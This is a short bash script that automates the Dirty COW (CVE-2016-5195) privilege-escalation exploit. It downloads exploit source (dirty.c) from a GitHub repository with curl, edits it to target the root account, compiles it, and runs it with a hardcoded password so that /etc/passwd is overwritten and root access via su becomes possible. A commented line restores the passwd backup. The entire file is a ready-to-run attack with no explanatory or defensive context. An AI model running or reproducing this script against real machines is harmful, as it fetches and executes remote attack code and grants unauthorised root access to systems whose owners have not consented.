#!/bin/bash

USER=root
PASSWORD=2142

SRC=dirty.c
COWNAME=dirty

curl -ks https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c > $SRC

sed -i "s/firefart/$USER/g" $SRC

gcc $SRC -o $COWNAME -lcrypt -lpthread

timeout 10s ./$COWNAME $PASSWORD

echo "Try access root with su ($USER:$PASSWORD)"

# mv /tmp/passwd.bak /etc/passwd